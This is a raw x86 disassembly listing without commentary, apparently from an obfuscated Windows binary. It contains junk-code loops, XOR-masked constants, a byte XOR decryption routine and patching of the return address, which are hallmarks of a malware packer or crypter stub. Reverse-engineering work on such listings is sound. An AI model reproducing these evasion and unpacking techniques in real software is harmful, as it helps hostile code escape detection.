  401f94:	add    ecx,DWORD PTR ds:0x429008
  401f9a:	inc    ecx
  401f9b:	mov    DWORD PTR ds:0x429008,ecx
  401fa1:	cmp    DWORD PTR ds:0x429008,0x19
  401fa8:	jne    0x401fb9
  401fae:	push   0x42e1ed
  401fb3:	call   DWORD PTR ds:0x42ed57
  401fb9:	cmp    DWORD PTR ds:0x429008,0x14
  401fc0:	jb     0x401f92
  401fc6:	adc    DWORD PTR ds:0x429020,0x76b9
  401fd0:	mov    ecx,DWORD PTR [ebp-0x1c]
  401fd3:	xor    eax,esi
  401fd5:	and    DWORD PTR ds:0x429008,0x42d004
  401fdf:	lea    eax,[eax+ecx*1+0x3272e0]
  401fe6:	or     DWORD PTR ds:0x42a018,0x3196
  401ff0:	push   eax
  401ff1:	mov    eax,ds:0x429020
  401ff6:	and    DWORD PTR ds:0x42c004,eax
  401ffc:	mov    eax,DWORD PTR [ebp-0x18]
  401fff:	sub    DWORD PTR ds:0x42a01c,0x429008
  402009:	xor    eax,esi
  40200b:	sbb    DWORD PTR ds:0x42c018,0x42b010
  402015:	lea    eax,[ebp+eax*1+0x3272e8]
  40201c:	push   eax
  40201d:	and    DWORD PTR ds:0x429018,0x0
  402027:	mov    eax,ds:0x429018
  40202c:	inc    eax
  40202d:	mov    ds:0x429018,eax
  402032:	cmp    DWORD PTR ds:0x429018,0x1f
  402039:	jne    0x40204a
  40203f:	push   0x2bf8
  402044:	call   DWORD PTR ds:0x42ed5b
  40204a:	cmp    DWORD PTR ds:0x429018,0x14
  402051:	jb     0x402027
  402057:	mov    eax,ds:0x42e42f
  40205c:	sbb    DWORD PTR ds:0x42d000,0x42b010
  402066:	push   DWORD PTR [eax+0x1bc]
  40206c:	and    DWORD PTR ds:0x429010,0x4b3f
  402076:	call   0x402a39
  40207b:	sbb    edx,edx
  40207d:	mov    eax,DWORD PTR [ebp-0xc]
  402080:	mov    ecx,DWORD PTR [ebp-0x1c]
  402083:	xor    eax,esi
  402085:	lea    eax,[ecx+eax*1+0x3272e0]
  40208c:	add    ecx,0x43f5
  402092:	mov    ecx,DWORD PTR [ebp-0xc]
  402095:	mov    edx,DWORD PTR [ebp-0xc]
  402098:	xor    edx,esi
  40209a:	xor    ecx,esi
  40209c:	sub    DWORD PTR ds:0x429018,0x429014
  4020a6:	add    ecx,edx
  4020a8:	mov    edx,DWORD PTR [ebp-0xc]
  4020ab:	sub    DWORD PTR ds:0x42d010,0x42d004
  4020b5:	xor    edx,esi
  4020b7:	lea    ecx,[ecx+edx*1+0x9758a0]
  4020be:	mov    DWORD PTR [ebp-0x1c],eax
  4020c1:	mov    DWORD PTR ds:0x42b000,0x3723
  4020cb:	cmp    eax,ecx
  4020cd:	jbe    0x401f1f
  4020d3:	sub    eax,ecx
  4020d5:	mov    eax,DWORD PTR [ebp+0xc]
  4020d8:	xor    ecx,DWORD PTR ds:0x42b01c
  4020de:	mov    ds:0x42e2b3,eax
  4020e3:	and    DWORD PTR ds:0x42d01c,0x0
  4020ed:	mov    eax,ds:0x42d01c
  4020f2:	inc    eax
  4020f3:	mov    ds:0x42d01c,eax
  4020f8:	cmp    DWORD PTR ds:0x42d01c,0x7
  4020ff:	jne    0x402115
  402105:	push   0x429018
  40210a:	push   0x165c
  40210f:	call   DWORD PTR ds:0x42ed5f
  402115:	cmp    DWORD PTR ds:0x42d01c,0x6
  40211c:	jne    0x402130
  402122:	xor    eax,eax
  402124:	or     eax,DWORD PTR ds:0x42d01c
  40212a:	inc    eax
  40212b:	mov    ds:0x42d01c,eax
  402130:	cmp    DWORD PTR ds:0x42d01c,0x13
  402137:	jb     0x4020ed
  40213d:	add    eax,eax
  40213f:	mov    eax,DWORD PTR [ebp+0x10]
  402142:	or     ecx,0x5144
  402148:	mov    ds:0x42e507,eax
  40214d:	movzx  ecx,BYTE PTR ds:0x42d018
  402154:	sbb    DWORD PTR ds:0x42a00c,ecx
  40215a:	mov    eax,ds:0x42e2b3
  40215f:	mov    ecx,DWORD PTR [ebp-0x38]
  402162:	sub    eax,edi
  402164:	xor    eax,esi
  402166:	mov    DWORD PTR ds:0x42a018,0x3718
  402170:	mov    DWORD PTR [ecx],eax
  402172:	mov    eax,DWORD PTR [ebp-0x2c]
  402175:	mov    DWORD PTR ds:0x429004,0x2ca7
  40217f:	cmp    eax,0xf89c85b9
  402184:	jne    0x402492
  40218a:	dec    DWORD PTR ds:0x42b018
  402190:	lea    eax,[ebp-0x48]
  402193:	adc    DWORD PTR ds:0x42d00c,0x15e5
  40219d:	mov    DWORD PTR [ebp-0x80],eax
  4021a0:	lea    eax,[ebp+0x4]
  4021a3:	and    DWORD PTR ds:0x42c01c,0x58e
  4021ad:	mov    DWORD PTR [ebp-0x48],eax
  4021b0:	mov    DWORD PTR ds:0x42d000,0x15
  4021ba:	cmp    DWORD PTR ds:0x42d000,0x0
  4021c1:	je     0x402216
  4021c7:	cmp    DWORD PTR ds:0x42d000,0x7
  4021ce:	jne    0x4021ee
  4021d4:	push   0x42e0f4
  4021d9:	push   DWORD PTR [ebp-0x14]
  4021dc:	push   DWORD PTR [ebp-0x28]
  4021df:	push   DWORD PTR [ebp-0x24]
  4021e2:	push   DWORD PTR [ebp-0xc]
  4021e5:	push   DWORD PTR [ebp-0x14]
  4021e8:	call   DWORD PTR ds:0x42ed67
  4021ee:	cmp    DWORD PTR ds:0x42d000,0x8
  4021f5:	jne    0x402206
  4021fb:	mov    eax,ds:0x42d000
  402200:	dec    eax
  402201:	mov    ds:0x42d000,eax
  402206:	mov    eax,ds:0x42d000
  40220b:	dec    eax
  40220c:	mov    ds:0x42d000,eax
  402211:	jmp    0x4021ba
  402216:	mov    eax,DWORD PTR [ebp-0x48]
  402219:	test   eax,eax
  40221b:	mov    DWORD PTR ds:0x42a014,0x24f3
  402225:	je     0x402a13
  40222b:	sub    DWORD PTR ds:0x42a000,edx
  402231:	mov    eax,DWORD PTR [ebp-0x24]
  402234:	sub    DWORD PTR ds:0x429004,ebx
  40223a:	mov    eax,DWORD PTR [ebp-0xc]
  40223d:	mov    eax,DWORD PTR [ebp-0x8]
  402240:	mov    DWORD PTR [ebp+0xc],eax
  402243:	mov    ecx,DWORD PTR ds:0x42b008
  402249:	sub    DWORD PTR ds:0x42b018,ecx
  40224f:	mov    eax,eax
  402251:	mov    eax,ds:0x42e42f
  402256:	mov    eax,DWORD PTR [eax+0x1c8]
  40225c:	and    DWORD PTR ds:0x42b000,0x0
  402266:	xor    ecx,ecx
  402268:	add    ecx,DWORD PTR ds:0x42b000
  40226e:	inc    ecx
  40226f:	mov    DWORD PTR ds:0x42b000,ecx
  402275:	cmp    DWORD PTR ds:0x42b000,0x1f
  40227c:	jne    0x402288
  402282:	call   DWORD PTR ds:0x42ed6b
  402288:	cmp    DWORD PTR ds:0x42b000,0x11
  40228f:	jb     0x402266
  402295:	or     DWORD PTR ds:0x42d008,0x79cb
  40229f:	mov    eax,DWORD PTR [eax]
  4022a1:	mov    DWORD PTR ds:0x42900c,0x1a
  4022ab:	cmp    DWORD PTR ds:0x42900c,0x0
  4022b2:	je     0x402307
  4022b8:	cmp    DWORD PTR ds:0x42900c,0xe
  4022bf:	jne    0x4022d5
  4022c5:	push   0x429014
  4022ca:	push   0x42e21d
  4022cf:	call   DWORD PTR ds:0x42ed6f
  4022d5:	cmp    DWORD PTR ds:0x42900c,0xf
  4022dc:	jne    0x4022ef
  4022e2:	mov    ecx,DWORD PTR ds:0x42900c
  4022e8:	dec    ecx
  4022e9:	mov    DWORD PTR ds:0x42900c,ecx
  4022ef:	mov    ecx,DWORD PTR ds:0x42900c
  4022f5:	dec    ecx
  4022f6:	mov    DWORD PTR ds:0x42900c,ecx
  4022fc:	jmp    0x4022ab
  402301:	and    ecx,DWORD PTR ds:0x42a014
  402307:	cdq    
  402308:	and    DWORD PTR ds:0x42901c,0x0
  402312:	jmp    0x402324
  402317:	mov    ecx,DWORD PTR ds:0x42901c
  40231d:	inc    ecx
  40231e:	mov    DWORD PTR ds:0x42901c,ecx
  402324:	cmp    DWORD PTR ds:0x42901c,0x11
  40232b:	jae    0x40234e
  402331:	cmp    DWORD PTR ds:0x42901c,0x1a
  402338:	jne    0x402349
  40233e:	push   0x42e0a2
  402343:	call   DWORD PTR ds:0x42ed73
  402349:	jmp    0x402317
  40234e:	mov    ebx,eax
  402350:	mov    ecx,DWORD PTR ds:0x42d008
  402356:	sbb    DWORD PTR ds:0x42a01c,ecx
  40235c:	mov    eax,0xfabdbee9
  402361:	add    ebx,eax
  402363:	adc    edx,0xffffffff
  402366:	xor    DWORD PTR ds:0x42d010,ecx
  40236c:	and    DWORD PTR [ebp-0x10],0x0
  402370:	xor    edx,0x0
  402373:	mov    ecx,DWORD PTR ds:0x42d014
  402379:	sub    DWORD PTR ds:0x429000,ecx
  40237f:	mov    DWORD PTR [ebp-0x68],edx
  402382:	mov    edx,DWORD PTR [ebp+0xc]
  402385:	dec    ecx
  402386:	mov    DWORD PTR [ebp-0x14],edx
  402389:	mov    ecx,0x8a29a12b
  40238e:	mov    DWORD PTR ds:0x42c014,0x77e
  402398:	xor    ebx,ecx
  40239a:	mov    edx,DWORD PTR ds:0x424c15
  4023a0:	mov    edx,DWORD PTR [edx]
  4023a2:	and    DWORD PTR ds:0x42d014,edx
  4023a8:	add    DWORD PTR [ebp-0x14],eax
  4023ab:	mov    edx,DWORD PTR [ebp-0x14]
  4023ae:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4023b2:	xor    edx,ecx
  4023b4:	mov    DWORD PTR [ebp-0x58],edx
  4023b7:	mov    edx,DWORD PTR [ebp-0x10]
  4023ba:	xor    edx,0x0
  4023bd:	mov    DWORD PTR ds:0x429014,0x2b65
  4023c7:	mov    DWORD PTR [ebp-0x54],edx
  4023ca:	mov    DWORD PTR ds:0x42c018,0x612d
  4023d4:	cmp    DWORD PTR [ebp-0x58],ebx
  4023d7:	mov    DWORD PTR ds:0x42a018,0x3565
  4023e1:	jne    0x402403
  4023e7:	mov    DWORD PTR ds:0x42b008,ecx
  4023ed:	mov    edx,DWORD PTR [ebp-0x68]
  4023f0:	cmp    DWORD PTR [ebp-0x54],edx
  4023f3:	mov    DWORD PTR ds:0x42a014,0xb50
  4023fd:	je     0x40246e
  402403:	mov    edx,DWORD PTR ds:0x42e42f
  402409:	mov    edx,DWORD PTR [edx+0x1c0]
  40240f:	adc    DWORD PTR ds:0x42b000,0x42b010
  402419:	mov    edx,DWORD PTR [edx]
  40241b:	xor    ebx,ebx
  40241d:	add    DWORD PTR ds:0x42900c,0x42b014
  402427:	add    edx,eax
  402429:	mov    DWORD PTR ds:0x42901c,0x5032
  402433:	adc    ebx,0xffffffff
  402436:	add    DWORD PTR ds:0x42b00c,0x1ef4
  402440:	xor    edx,ecx
  402442:	xor    ebx,0x0
  402445:	mov    DWORD PTR ds:0x429020,0x6916
  40244f:	cmp    edx,0x70941fc1
  402455:	mov    DWORD PTR ds:0x42a018,0x39ab
  40245f:	jne    0x402a13
  402465:	cmp    ebx,0xffffffff
  402468:	jne    0x402a13
  40246e:	mov    edx,DWORD PTR ds:0x42e4ab
  402474:	mov    ebx,DWORD PTR ds:0x42e4b3
  40247a:	xor    edx,ebx
  40247c:	mov    DWORD PTR ds:0x42e4ab,edx
  402482:	mov    ebx,DWORD PTR ds:0x42e4ab
  402488:	mov    edx,DWORD PTR [ebp-0x48]
  40248b:	add    DWORD PTR [edx],ebx
  40248d:	jmp    0x4029d4
  402492:	mov    eax,DWORD PTR [ebp-0x3c]
  402495:	cmp    eax,0xf89c85b8
  40249a:	je     0x4024f7
  4024a0:	mov    eax,DWORD PTR [ebp-0x8]
  4024a3:	mov    ecx,DWORD PTR [ebp-0x40]
  4024a6:	xor    eax,esi
  4024a8:	add    eax,edi
  4024aa:	cmp    eax,ecx
  4024ac:	je     0x4024f7
  4024b2:	mov    eax,ds:0x42e42f
  4024b7:	mov    eax,DWORD PTR [eax+0x194]
  4024bd:	mov    ecx,DWORD PTR [eax]
  4024bf:	mov    eax,DWORD PTR [ecx+0x3c]
  4024c2:	push   DWORD PTR ds:0x42e507
  4024c8:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4024cc:	push   DWORD PTR ds:0x42e2b3
  4024d2:	add    eax,ecx
  4024d4:	mov    ecx,DWORD PTR ds:0x42e42f
  4024da:	mov    ecx,DWORD PTR [ecx+0x194]
  4024e0:	push   DWORD PTR [ecx]
  4024e2:	call   eax
  4024e4:	mov    ecx,DWORD PTR ds:0x42e42f
  4024ea:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4024f0:	mov    DWORD PTR [ecx],eax
  4024f2:	jmp    0x402a13
  4024f7:	mov    eax,DWORD PTR [ebp-0x8]
  4024fa:	mov    ecx,DWORD PTR [ebp-0x7c]
  4024fd:	xor    eax,esi
  4024ff:	add    eax,edi
  402501:	cmp    eax,ecx
  402503:	jne    0x4028ce
  402509:	mov    eax,DWORD PTR [ebp-0x8]
  40250c:	mov    ecx,DWORD PTR ds:0x42e42f
  402512:	mov    ecx,DWORD PTR [ecx+0x198]
  402518:	xor    eax,esi
  40251a:	add    eax,edi
  40251c:	cmp    eax,DWORD PTR [ecx]
  40251e:	jne    0x40253d
  402524:	mov    eax,DWORD PTR [ebp-0x8]
  402527:	push   0xf89c85b9
  40252c:	xor    eax,esi
  40252e:	add    eax,edi
  402530:	push   eax
  402531:	push   ebx
  402532:	push   DWORD PTR [ebp-0xc]
  402535:	push   DWORD PTR [ebp-0x8]
  402538:	call   0x40c765
  40253d:	mov    eax,DWORD PTR [ebp-0xc]
  402540:	mov    DWORD PTR [ebp-0x44],eax
  402543:	mov    eax,DWORD PTR [ebp-0x8]
  402546:	mov    DWORD PTR [ebp-0x1c],eax
  402549:	mov    eax,DWORD PTR [ebp-0x1c]
  40254c:	xor    eax,esi
  40254e:	add    eax,edi
  402550:	mov    DWORD PTR [ebp+0x10],eax
  402553:	mov    eax,ds:0x42e2af
  402558:	mov    eax,DWORD PTR [eax]
  40255a:	mov    DWORD PTR [ebp+0x10],eax
  40255d:	mov    eax,ds:0x42e4b7
  402562:	mov    eax,DWORD PTR [eax]
  402564:	mov    DWORD PTR [ebp-0x18],eax
  402567:	mov    DWORD PTR [ebp+0xc],0xf89c87b9
  40256e:	mov    eax,DWORD PTR [ebp+0xc]
  402571:	xor    eax,esi
  402573:	add    eax,edi
  402575:	mov    DWORD PTR [ebp+0xc],eax
  402578:	mov    eax,ds:0x42e42f
  40257d:	mov    DWORD PTR [ebp+0xc],eax
  402580:	mov    eax,DWORD PTR [ebp+0x10]
  402583:	mov    DWORD PTR [ebp+0xc],eax
  402586:	mov    eax,DWORD PTR [ebp+0xc]
  402589:	push   0x4
  40258b:	pop    ecx
  40258c:	sub    ecx,eax
  40258e:	add    ecx,DWORD PTR [ebp-0x18]
  402591:	mov    DWORD PTR [ebp-0x38],0xf89c85f9
  402598:	mov    DWORD PTR [ebp+0x10],ecx
  40259b:	mov    DWORD PTR [ebp-0xdc],ebx
  4025a1:	mov    eax,DWORD PTR [ebp+0xc]
  4025a4:	mov    DWORD PTR [ebp-0xd8],eax
  4025aa:	mov    eax,DWORD PTR [ebp+0x10]
  4025ad:	mov    DWORD PTR [ebp-0xd4],eax
  4025b3:	mov    eax,DWORD PTR [ebp-0x38]
  4025b6:	xor    eax,esi
  4025b8:	add    eax,edi
  4025ba:	mov    DWORD PTR [ebp-0xd0],eax
  4025c0:	lea    eax,[ebp-0x88]
  4025c6:	mov    DWORD PTR [ebp-0xcc],eax
  4025cc:	mov    eax,DWORD PTR [ebp-0xdc]
  4025d2:	xor    eax,esi
  4025d4:	add    eax,edi
  4025d6:	mov    DWORD PTR [ebp-0xdc],eax
  4025dc:	lea    eax,[ebp-0xdc]
  4025e2:	push   eax
  4025e3:	mov    eax,DWORD PTR [ebp-0x44]
  4025e6:	xor    eax,esi
  4025e8:	add    eax,edi
  4025ea:	push   eax
  4025eb:	mov    eax,ds:0x42e44f
  4025f0:	push   0x42e3a5
  4025f5:	push   DWORD PTR [eax]
  4025f7:	call   0x4050c0
  4025fc:	mov    eax,DWORD PTR [ebp+0xc]
  4025ff:	mov    ecx,DWORD PTR [ebp+0x10]
  402602:	mov    DWORD PTR [ebp-0x78],ecx
  402605:	mov    ecx,DWORD PTR [ebp-0x1c]
  402608:	xor    ecx,esi
  40260a:	mov    DWORD PTR [ebp-0x18],eax
  40260d:	add    ecx,edi
  40260f:	jmp    0x40286f
  402614:	lea    edx,[ecx+eax*1]
  402617:	mov    DWORD PTR [ebp+0x10],edx
  40261a:	mov    edx,DWORD PTR [ebp-0x78]
  40261d:	sub    edx,ecx
  40261f:	mov    DWORD PTR [ebp+0xc],edx
  402622:	mov    edx,DWORD PTR [ebp+0xc]
  402625:	mov    DWORD PTR [ebp-0x50],edx
  402628:	mov    edx,DWORD PTR [ebp+0x10]
  40262b:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  402632:	mov    DWORD PTR [ebp-0x68],edx
  402635:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  40263c:	mov    edx,DWORD PTR [ebp-0x4c]
  40263f:	xor    edx,esi
  402641:	add    edx,edi
  402643:	mov    DWORD PTR [ebp+0x10],edx
  402646:	mov    edx,DWORD PTR [ebp-0x4c]
  402649:	xor    edx,esi
  40264b:	add    edx,edi
  40264d:	mov    DWORD PTR [ebp+0xc],edx
  402650:	mov    DWORD PTR [ebp-0x64],0xf89c85d9
  402657:	mov    DWORD PTR [ebp-0x60],0xf89c85be
  40265e:	mov    edx,DWORD PTR [ebp-0x4c]
  402661:	mov    ebx,DWORD PTR [ebp-0x50]
  402664:	xor    edx,esi
  402666:	add    edx,edi
  402668:	cmp    ebx,edx
  40266a:	je     0x402863
  402670:	mov    eax,DWORD PTR [ebp-0x20]
  402673:	xor    eax,esi
  402675:	mov    edx,0xffcd8d20
  40267a:	sub    edx,eax
  40267c:	add    edx,DWORD PTR [ebp-0x50]
  40267f:	mov    eax,DWORD PTR [ebp-0x20]
  402682:	mov    ebx,DWORD PTR [ebp+0x10]
  402685:	xor    eax,esi
  402687:	add    eax,edi
  402689:	imul   eax,ebx
  40268c:	cmp    eax,edx
  40268e:	ja     0x402860
  402694:	mov    edx,DWORD PTR [ebp+0x10]
  402697:	mov    eax,DWORD PTR [ebp-0x50]
  40269a:	mov    ebx,DWORD PTR [ebp-0x64]
  40269d:	sub    eax,edx
  40269f:	xor    ebx,esi
  4026a1:	xor    edx,edx
  4026a3:	add    ebx,edi
  4026a5:	div    ebx
  4026a7:	mov    DWORD PTR [ebp+0xc],eax
  4026aa:	mov    eax,DWORD PTR [ebp-0x60]
  4026ad:	mov    edx,DWORD PTR [ebp+0xc]
  4026b0:	xor    eax,esi
  4026b2:	add    eax,edi
  4026b4:	cmp    edx,eax
  4026b6:	jbe    0x4026c6
  4026bc:	mov    eax,DWORD PTR [ebp-0x60]
  4026bf:	xor    eax,esi
  4026c1:	add    eax,edi
  4026c3:	mov    DWORD PTR [ebp+0xc],eax
  4026c6:	mov    eax,DWORD PTR [ebp-0x64]
  4026c9:	mov    edx,DWORD PTR [ebp+0xc]
  4026cc:	xor    eax,esi
  4026ce:	add    eax,edi
  4026d0:	imul   eax,edx
  4026d3:	mov    DWORD PTR [ebp+0xc],eax
  4026d6:	mov    eax,DWORD PTR [ebp-0x4c]
  4026d9:	mov    edx,DWORD PTR [ebp+0xc]
  4026dc:	xor    eax,esi
  4026de:	add    eax,edi
  4026e0:	cmp    edx,eax
  4026e2:	je     0x402849
  4026e8:	mov    eax,DWORD PTR [ebp+0xc]
  4026eb:	mov    DWORD PTR [ebp-0x2c],eax
  4026ee:	mov    eax,DWORD PTR [ebp+0x10]
  4026f1:	add    eax,DWORD PTR [ebp-0x68]
  4026f4:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  4026fb:	mov    DWORD PTR [ebp-0x28],eax
  4026fe:	mov    eax,0xf89c85b8
  402703:	mov    DWORD PTR [ebp-0x5c],eax
  402706:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  40270d:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  402714:	mov    DWORD PTR [ebp-0x30],eax
  402717:	mov    eax,DWORD PTR [ebp-0x38]
  40271a:	xor    eax,esi
  40271c:	add    eax,edi
  40271e:	jmp    0x402805
  402723:	mov    DWORD PTR [ebp-0x70],0xf89c85b3
  40272a:	mov    DWORD PTR [ebp-0x74],0xf89c85ad
  402731:	mov    eax,DWORD PTR [ebp-0x30]
  402734:	mov    edx,DWORD PTR [ebp+0xc]
  402737:	xor    eax,esi
  402739:	add    eax,edi
  40273b:	imul   eax,edx
  40273e:	mov    edx,DWORD PTR [ebp-0x28]
  402741:	mov    al,BYTE PTR [eax+edx*1]
  402744:	mov    BYTE PTR [ebp-0x1],al
  402747:	mov    eax,DWORD PTR [ebp-0x30]
  40274a:	mov    edx,DWORD PTR [ebp+0xc]
  40274d:	xor    eax,esi
  40274f:	add    eax,edi
  402751:	imul   eax,edx
  402754:	mov    edx,DWORD PTR [ebp-0x54]
  402757:	xor    edx,esi
  402759:	add    eax,edx
  40275b:	mov    edx,DWORD PTR [ebp-0x28]
  40275e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e0]
  402766:	mov    edx,DWORD PTR [ebp-0x70]
  402769:	xor    edx,esi
  40276b:	lea    eax,[edx+eax*1+0x3272e0]
  402772:	movzx  edx,BYTE PTR [ebp-0x1]
  402776:	xor    edx,eax
  402778:	mov    BYTE PTR [ebp-0x1],dl
  40277b:	mov    al,BYTE PTR [ebp-0x1]
  40277e:	mov    edx,DWORD PTR [ebp-0x30]
  402781:	mov    ebx,DWORD PTR [ebp+0xc]
  402784:	xor    edx,esi
  402786:	add    edx,edi
  402788:	imul   edx,ebx
  40278b:	mov    ebx,DWORD PTR [ebp-0x28]
  40278e:	mov    BYTE PTR [edx+ebx*1],al
  402791:	mov    eax,DWORD PTR [ebp-0x30]
  402794:	mov    edx,DWORD PTR [ebp+0xc]
  402797:	xor    eax,esi
  402799:	add    eax,edi
  40279b:	imul   eax,edx
  40279e:	mov    edx,DWORD PTR [ebp-0x28]
  4027a1:	mov    al,BYTE PTR [eax+edx*1]
  4027a4:	mov    BYTE PTR [ebp-0x1],al
  4027a7:	mov    eax,DWORD PTR [ebp-0x30]
  4027aa:	mov    edx,DWORD PTR [ebp+0xc]
  4027ad:	xor    eax,esi
  4027af:	add    eax,edi
  4027b1:	imul   eax,edx
  4027b4:	mov    edx,DWORD PTR [ebp-0x5c]
  4027b7:	xor    edx,esi
  4027b9:	add    eax,edx
  4027bb:	mov    edx,DWORD PTR [ebp-0x28]
  4027be:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e0]
  4027c6:	mov    edx,DWORD PTR [ebp-0x74]
  4027c9:	xor    edx,esi
  4027cb:	lea    eax,[edx+eax*1+0x3272e0]
  4027d2:	movzx  edx,BYTE PTR [ebp-0x1]
  4027d6:	xor    edx,eax
  4027d8:	mov    BYTE PTR [ebp-0x1],dl
  4027db:	mov    al,BYTE PTR [ebp-0x1]
  4027de:	mov    edx,DWORD PTR [ebp-0x30]
  4027e1:	mov    ebx,DWORD PTR [ebp+0xc]
  4027e4:	xor    edx,esi
  4027e6:	add    edx,edi
  4027e8:	imul   edx,ebx
  4027eb:	mov    ebx,DWORD PTR [ebp-0x28]
  4027ee:	mov    BYTE PTR [edx+ebx*1],al
  4027f1:	mov    eax,DWORD PTR [ebp-0x10]
  4027f4:	mov    edx,DWORD PTR [ebp-0x5c]
  4027f7:	xor    eax,esi
  4027f9:	xor    edx,esi
  4027fb:	add    eax,edi
  4027fd:	add    edx,edi
  4027ff:	imul   eax,edx
  402802:	add    eax,DWORD PTR [ebp+0xc]
  402805:	mov    DWORD PTR [ebp+0xc],eax
  402808:	mov    eax,DWORD PTR [ebp+0xc]
  40280b:	mov    edx,DWORD PTR [ebp-0x2c]
  40280e:	cmp    edx,eax
  402810:	jb     0x402723
  402816:	mov    eax,DWORD PTR [ebp-0x5c]
  402819:	mov    edx,DWORD PTR [ebp-0x2c]
  40281c:	xor    eax,esi
  40281e:	add    eax,edi
  402820:	imul   eax,edx
  402823:	mov    edx,DWORD PTR [ebp-0x38]
  402826:	xor    edx,esi
  402828:	add    edx,edi
  40282a:	or     eax,edx
  40282c:	mov    edx,DWORD PTR [ebp-0x20]
  40282f:	xor    edx,esi
  402831:	add    eax,edx
  402833:	mov    edx,DWORD PTR [ebp-0x20]
  402836:	xor    edx,esi
  402838:	add    eax,edx
  40283a:	mov    edx,DWORD PTR [ebp+0x10]
  40283d:	lea    eax,[eax+edx*1+0x64e5c0]
  402844:	jmp    0x402858
  402849:	mov    eax,DWORD PTR [ebp-0x20]
  40284c:	mov    edx,DWORD PTR [ebp+0x10]
  40284f:	xor    eax,esi
  402851:	lea    eax,[eax+edx*1+0x3272e0]
  402858:	mov    DWORD PTR [ebp+0x10],eax
  40285b:	jmp    0x402670
  402860:	mov    eax,DWORD PTR [ebp-0x18]
  402863:	mov    edx,DWORD PTR [ebp-0x44]
  402866:	xor    edx,esi
  402868:	lea    ecx,[ecx+edx*1+0x3272e0]
  40286f:	lea    edx,[ecx-0x3272e0]
  402875:	xor    edx,esi
  402877:	cmp    edx,0xf89c95b9
  40287d:	jne    0x402614
  402883:	mov    ecx,DWORD PTR [ebp-0x1c]
  402886:	mov    edx,DWORD PTR [ebp-0x44]
  402889:	mov    ebx,DWORD PTR [ebp-0x1c]
  40288c:	xor    edx,esi
  40288e:	mov    dl,BYTE PTR [edx+eax*1+0x3272e0]
  402895:	xor    ecx,esi
  402897:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e0]
  40289e:	xor    ebx,esi
  4028a0:	mov    BYTE PTR [ebx+eax*1+0x3272e0],dl
  4028a7:	mov    edx,DWORD PTR [ebp-0x44]
  4028aa:	xor    edx,esi
  4028ac:	mov    BYTE PTR [edx+eax*1+0x3272e0],cl
  4028b3:	mov    eax,DWORD PTR [ebp-0x44]
  4028b6:	mov    eax,DWORD PTR [ebp-0x8]
  4028b9:	xor    eax,esi
  4028bb:	add    eax,edi
  4028bd:	mov    ds:0x42e4b3,eax
  4028c2:	mov    eax,DWORD PTR [ebp-0x8]
  4028c5:	xor    eax,esi
  4028c7:	add    eax,edi
  4028c9:	mov    ds:0x42e4ab,eax
  4028ce:	lea    eax,[ebp-0x34]
  4028d1:	mov    DWORD PTR [ebp-0x98],eax
  4028d7:	lea    eax,[ebp+0x4]
  4028da:	mov    DWORD PTR [ebp-0x34],eax
  4028dd:	mov    eax,DWORD PTR [ebp-0x34]
  4028e0:	test   eax,eax
  4028e2:	je     0x402a13
  4028e8:	mov    DWORD PTR [ebp-0x90],0xf152c30
  4028f2:	mov    DWORD PTR [ebp-0x84],0x712ed0f
  4028fc:	mov    DWORD PTR [ebp-0x8c],0x373fc21
  402906:	mov    DWORD PTR [ebp-0x94],0x72670a11
  402910:	call   0x40a04c
  402915:	mov    eax,DWORD PTR [ebp-0x24]
  402918:	mov    eax,DWORD PTR [ebp-0xc]
  40291b:	mov    eax,DWORD PTR [ebp-0x8]
  40291e:	mov    DWORD PTR [ebp+0xc],eax
  402921:	mov    eax,eax
  402923:	mov    eax,ds:0x42e42f
  402928:	mov    eax,DWORD PTR [eax+0x1c8]
  40292e:	mov    eax,DWORD PTR [eax]
  402930:	cdq    
  402931:	mov    ebx,eax
  402933:	mov    eax,0xfabdbee9
  402938:	add    ebx,eax
  40293a:	adc    edx,0xffffffff
  40293d:	and    DWORD PTR [ebp-0x10],0x0
  402941:	xor    edx,0x0
  402944:	mov    DWORD PTR [ebp-0x68],edx
  402947:	mov    edx,DWORD PTR [ebp+0xc]
  40294a:	mov    DWORD PTR [ebp-0x14],edx
  40294d:	mov    ecx,0x8a29a12b
  402952:	xor    ebx,ecx
  402954:	add    DWORD PTR [ebp-0x14],eax
  402957:	mov    edx,DWORD PTR [ebp-0x14]
  40295a:	adc    DWORD PTR [ebp-0x10],0xffffffff
  40295e:	xor    edx,ecx
  402960:	mov    DWORD PTR [ebp-0x58],edx
  402963:	mov    edx,DWORD PTR [ebp-0x10]
  402966:	xor    edx,0x0
  402969:	mov    DWORD PTR [ebp-0x54],edx
  40296c:	cmp    DWORD PTR [ebp-0x58],ebx
  40296f:	jne    0x402981
  402975:	mov    edx,DWORD PTR [ebp-0x68]
  402978:	cmp    DWORD PTR [ebp-0x54],edx
  40297b:	je     0x4029b0
  402981:	mov    edx,DWORD PTR ds:0x42e42f
  402987:	mov    edx,DWORD PTR [edx+0x1c0]
  40298d:	mov    edx,DWORD PTR [edx]
  40298f:	xor    ebx,ebx
  402991:	add    edx,eax
  402993:	adc    ebx,0xffffffff
  402996:	xor    edx,ecx
  402998:	xor    ebx,0x0
  40299b:	cmp    edx,0x70941fc1
  4029a1:	jne    0x402a13
  4029a7:	cmp    ebx,0xffffffff
  4029aa:	jne    0x402a13
  4029b0:	mov    edx,DWORD PTR ds:0x42e4ab
  4029b6:	mov    ebx,DWORD PTR ds:0x42e4b3
  4029bc:	xor    edx,ebx
  4029be:	mov    DWORD PTR ds:0x42e4ab,edx
  4029c4:	mov    edx,DWORD PTR [ebp-0x34]
  4029c7:	mov    ebx,DWORD PTR ds:0x42e4ab
  4029cd:	add    ebx,DWORD PTR [edx]
  4029cf:	mov    edx,DWORD PTR [ebp-0x34]
  4029d2:	mov    DWORD PTR [edx],ebx
  4029d4:	mov    edx,DWORD PTR [ebp+0xc]
  4029d7:	xor    esi,edx
  4029d9:	mov    edx,DWORD PTR ds:0x42e4ab
  4029df:	add    esi,edi
  4029e1:	xor    ebx,ebx
  4029e3:	add    esi,eax
  4029e5:	adc    ebx,0xffffffff
